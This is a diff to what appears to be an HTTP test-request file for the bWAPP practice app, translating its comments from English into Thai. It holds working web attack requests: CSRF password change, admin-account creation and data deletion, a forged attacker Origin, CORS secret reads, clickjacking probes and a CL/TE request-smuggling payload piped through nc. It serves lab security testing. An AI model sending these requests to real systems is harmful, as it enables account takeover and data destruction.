@@ -5,12 +5,12 @@
 ### ============================================================================
 
 ### ---------------------------------------------------------------------------
-### CSRF-01  Change another user's password - no token, no confirmation
-###   The classic CSRF PoC shape: everything a <form> can send, nothing that
-###   proves the user intended it. Note there is no Origin/Referer check either,
-###   and the session cookie is not SameSite-restricted.
-###   Steal this request into an attacker's auto-submitting HTML page and any
-###   logged-in bWAPP user who visits it has their password replaced.
+### CSRF-01  เปลี่ยนรหัสผ่านของผู้ใช้อื่น - ไม่มี token ไม่มีการยืนยัน
+###   รูปแบบ CSRF PoC คลาสสิก: ส่งได้ทุกอย่างที่ <form> ส่งได้ แต่ไม่มีอะไร
+###   ที่พิสูจน์ว่าผู้ใช้ตั้งใจทำ สังเกตว่าไม่มีการเช็ค Origin/Referer
+###   ด้วย และ session cookie ก็ไม่ได้จำกัดด้วย SameSite
+###   เอา request นี้ไปยัดในหน้า HTML ที่ auto-submit ของผู้โจมตี ผู้ใช้
+###   bWAPP ที่ล็อกอินอยู่แล้วแค่เข้าไปเจอ รหัสผ่านก็ถูกเปลี่ยนทันที
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/csrf_1.php HTTP/1.1
 Host: localhost:8443
@@ -18,15 +18,15 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 password=pwned&password_conf=pwned&form=submit
-### Expected: 200, success; no anti-CSRF token was requested or validated
-### Restore afterwards with 06-auth-session.http AUTH-08.
+### Expected: 200, สำเร็จ ไม่มีการขอหรือตรวจ anti-CSRF token เลย
+### คืนค่ากลับทีหลังด้วย 06-auth-session.http AUTH-08
 
 
 ### ---------------------------------------------------------------------------
-### CSRF-02  Privilege escalation - create a brand new ADMIN account
-###   csrf_2.php creates users and honours the `admin` field with no token and
-###   no privilege check. This is CSRF chained into full account takeover:
-###   victim visits a page, attacker gets an admin account.
+### CSRF-02  Privilege escalation - สร้างบัญชี ADMIN ใหม่ทั้งที่
+###   csrf_2.php สร้าง user และเชื่อ field `admin` โดยไม่มี token และไม่มี
+###   การเช็ค privilege นี่คือ CSRF ที่ต่อยอดไปถึงการยึดบัญชีเต็มรูปแบบ:
+###   เหยื่อแค่เปิดหน้าเว็บ ผู้โจมตีก็ได้บัญชี admin
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/csrf_2.php HTTP/1.1
 Host: localhost:8443
@@ -34,14 +34,14 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 login=attacker&password=attacker&email=attacker%40evil.com&secret=x&activated=on&admin=on&form=submit
-### Expected: 200, account "attacker" created with admin rights
-### Verify:  POST {{baseUrl}}/login.php with login=attacker&password=attacker
+### Expected: 200, สร้างบัญชี "attacker" ที่มีสิทธิ์ admin
+### ตรวจสอบ:  POST {{baseUrl}}/login.php ด้วย login=attacker&password=attacker
 
 
 ### ---------------------------------------------------------------------------
-### CSRF-03  Destructive action - delete blog entries with no token
-###   sqli_7.php deletes rows straight from a POST with no confirmation step
-###   and no token, so one cross-site POST wipes the data.
+### CSRF-03  การทำลายข้อมูล - ลบบล็อกโดยไม่มี token
+###   sqli_7.php ลบแถวข้อมูลจาก POST ทันที ไม่มีขั้นตอนยืนยันและไม่มี
+###   token POST ข้ามไซต์ครั้งเดียวก็ล้างข้อมูลทั้งหมด
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_7.php HTTP/1.1
 Host: localhost:8443
@@ -49,13 +49,13 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 entry_delete=1&blog=submit&form=submit
-### Expected: 200, the blog entry is gone
+### Expected: 200, รายการบล็อกถูกลบแล้ว
 
 
 ### ---------------------------------------------------------------------------
-### CSRF-04  Cross-site request forgery with an explicit attacker Origin
-###   Re-sends CSRF-02 while advertising a foreign Origin, to show the server
-###   neither validates Origin/Referer nor sets SameSite on the session cookie.
+### CSRF-04  Cross-site request forgery ที่ประกาศ Origin ของผู้โจมตีชัดเจน
+###   ส่ง CSRF-02 ซ้ำโดยประกาศ Origin ของโฮสต์อื่น เพื่อชี้ว่า server
+###   ไม่ตรวจ Origin/Referer และไม่ได้ตั้ง SameSite ให้ session cookie
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/csrf_2.php HTTP/1.1
 Host: localhost:8443
@@ -65,36 +65,36 @@ Referer: http://attacker.evil.com/csrf.html
 Content-Type: application/x-www-form-urlencoded
 
 login=attacker2&password=attacker2&email=a2%40evil.com&secret=x&activated=on&admin=on&form=submit
-### Expected: 200, the request is processed exactly as if it were first-party
+### Expected: 200, request ถูกประมวลผลเหมือนมาจาก first-party ทุกประการ
 
 
 ### ---------------------------------------------------------------------------
-### CLICK-01  Clickjacking - no frame protection
-###   The response carries no X-Frame-Options and no CSP frame-ancestors, so
-###   any third-party page can iframe bWAPP and overlay transparent buttons on
-###   top of state-changing controls (delete, password change, transfer).
+### CLICK-01  Clickjacking - ไม่มีการป้องกันการถูกฝังเฟรม
+###   response ไม่มี X-Frame-Options และไม่มี CSP frame-ancestors หน้า
+###   third-party ใดก็ iframe bWAPP แล้ววางปุ่มโปร่งใสทับ control ที่
+###   เปลี่ยนสถานะ (delete, password change, transfer) ได้
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/clickjacking.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, and NO X-Frame-Options / frame-ancestors in the response headers
-### Fix: Content-Security-Policy: frame-ancestors 'none'
+### Expected: 200, และไม่มี X-Frame-Options / frame-ancestors ใน response header
+### แก้: Content-Security-Policy: frame-ancestors 'none'
 
 
 ### ---------------------------------------------------------------------------
-### CLICK-02  Clickjacking is not limited to the demo page - the real admin
-###           settings page is framable too
+### CLICK-02  Clickjacking ไม่ได้จำกัดอยู่ที่หน้า demo - หน้า settings
+###           ของ admin จริงก็ถูกฝังเฟรมได้เหมือนกัน
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/admin/ HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, settings page with no frame protection
+### Expected: 200, หน้า settings ที่ไม่มี frame protection
 
 
 ### ---------------------------------------------------------------------------
-### CORS-01  Wildcard Access-Control-Allow-Origin on a secret-bearing endpoint
-###   secret-cors-1.php serves "Neo's secret" with ACAO: *. Any website the
-###   victim visits can read it cross-origin. Response body is the proof.
+### CORS-01  Wildcard Access-Control-Allow-Origin บน endpoint ที่มี secret
+###   secret-cors-1.php เสิร์ฟ "Neo's secret" พร้อม ACAO: * เว็บไซต์ใดก็ตาม
+###   ที่เหยื่อเข้าไปเยี่ยมอ่านข้าม origin ได้ response body คือหลักฐาน
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/secret-cors-1.php HTTP/1.1
 Host: localhost:8443
@@ -105,10 +105,10 @@ Cookie: {{authCookie}}
 
 
 ### ---------------------------------------------------------------------------
-### CORS-02  Over-narrow allow-list that still reflects a chosen origin
-###   secret-cors-2.php only sets the header when Origin is exactly
-###   http://intranet.itsecgames.com - including subdomain-style collisions and
-###   the fact that any page on that host can then read the secret.
+### CORS-02  allow-list แคบเกินไป แต่ยังสะท้อน Origin ที่เลือกมาได้
+###   secret-cors-2.php ตั้ง header เฉพาะเมื่อ Origin ตรงกับ
+###   http://intranet.itsecgames.com เป๊ะ ๆ ซึ่งเปิดช่องทั้งการชนกับโดเมน
+###   รูปแบบ subdomain และการที่ทุกหน้าบนโฮสต์นั้นอ่าน secret ได้ต่อ
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/secret-cors-2.php HTTP/1.1
 Host: localhost:8443
@@ -120,30 +120,30 @@ Origin: http://intranet.itsecgames.com
 
 
 ### ---------------------------------------------------------------------------
-### CORS-03  Negative control - the endpoint leaks a secret with NO CORS header
-###   secret-cors-3.php returns "Johnny's secret" with no CORS headers, so a
-###   browser blocks cross-origin reads here. Included to show the contrast and
-###   to prove the CORS-01 finding is about the header, not the payload.
+### CORS-03  Negative control - endpoint ที่รั่ว secret โดยไม่มี CORS header
+###   secret-cors-3.php คืน "Johnny's secret" โดยไม่มี CORS header เลย
+###   เบราว์เซอร์จึงบล็อกการอ่านข้าม origin ที่นี่ เก็บไว้เพื่อเทียบเคียงกัน
+###   และพิสูจน์ว่าข้อพบของ CORS-01 เกี่ยวกับ header ไม่ใช่ payload
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/secret-cors-3.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, body "Johnny's secret: I'm the Ghost Rider!" and NO
-###           Access-Control-Allow-Origin - browsers block this cross-origin.
+### Expected: 200, body "Johnny's secret: I'm the Ghost Rider!" และไม่มี
+###           Access-Control-Allow-Origin - เบราว์เซอร์บล็อกการอ่านข้าม origin นี้
 
 
 ### ---------------------------------------------------------------------------
-### SM-01  HTTP request smuggling surface - CL/TE disagreement
-###   Kept in the suite as the shape of the attack and as a re-test point after any
-###   Apache upgrade. Apache 2.4 on this image rejects the ambiguity (400), so no
-###   smuggled request reaches PHP - there is no desync primitive here.
-###   NOT SENT BY THE RUNNER: .NET's HttpWebRequest owns Content-Length and
-###   Transfer-Encoding and silently rewrites both, so it cannot emit a
-###   contradictory pair. Send this with a raw client to actually test it:
+### SM-01  พื้นที่ HTTP request smuggling - CL/TE ไม่ตรงกัน
+###   เก็บไว้ในชุดนี้เพื่อแสดงรูปแบบของการโจมตี และเป็นจุดที่ต้องทดสอบ
+###   ซ้ำหลังอัปเกรด Apache ทุกครั้ง Apache 2.4 ใน image นี้ปฏิเสธความ
+###   กำกวมนี้ (400) request ที่ smuggle จึงไม่ถึง PHP - ที่นี่ไม่มี desync
+###   primitive ตัวรันส่งให้ไม่ได้: HttpWebRequest ของ .NET เป็นเจ้าของ
+###   Content-Length และ Transfer-Encoding แล้วเขียนทับทั้งคู่เงียบ ๆ
+###   จึงส่งคู่ที่ขัดกันออกไปไม่ได้ ใช้ raw client ส่งเองถ้าจะทดสอบจริง:
 ###     printf 'POST /secret.php HTTP/1.1\r\nHost: localhost:8443\r\nContent-Length: 42\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n' | nc localhost 8443
 ### ---------------------------------------------------------------------------
 ### SKIP
-### RUNNER-CANNOT-SEND: Content-Length / Transfer-Encoding are rewritten by the client
+### RUNNER-CANNOT-SEND: Content-Length / Transfer-Encoding ถูก client เขียนทับ
 POST {{baseUrl}}/secret.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
@@ -152,4 +152,4 @@ Transfer-Encoding: chunked
 
 0
 
-### Expected: 400 Bad Request (no smuggled request reaches the backend)
+### Expected: 400 Bad Request (ไม่มี request ที่ smuggle ไปถึง backend)
